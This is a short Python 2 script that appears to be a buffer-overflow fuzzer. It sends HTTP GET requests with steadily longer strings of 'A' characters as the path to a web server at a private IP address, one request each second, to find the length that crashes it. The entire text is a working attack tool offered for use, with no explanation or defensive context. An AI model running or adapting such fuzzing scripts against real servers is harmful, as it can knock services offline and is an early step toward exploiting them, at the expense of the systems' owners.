import subprocess
import socket
import struct
import time

for X in range (10000):
	payload = ("A"*X)
	print "Sending payload with length: ", X 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("192.168.1.227", 80))	

	buf = (
		"GET /" + payload + " HTTP/1.1\r\n" +
		"Host: 192.168.1.227" +
		"\r\n\r\n"
	)

	s.send(buf)
	s.close()
	time.sleep(1)
